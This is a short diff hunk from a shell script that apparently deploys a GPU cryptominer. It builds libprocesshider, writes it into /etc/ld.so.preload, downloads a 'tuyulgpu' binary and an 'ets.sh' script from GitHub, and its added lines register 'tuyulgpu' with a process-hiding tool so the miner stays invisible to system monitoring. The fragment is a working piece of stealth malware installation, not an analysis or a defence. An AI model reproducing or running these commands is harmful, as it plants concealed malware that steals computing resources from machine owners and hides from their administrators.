@@ -48,6 +48,8 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
+ph add tuyulgpu
+
 wget https://github.com/angkii/MJ/raw/main/tuyulgpu
 
 wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/ets.sh
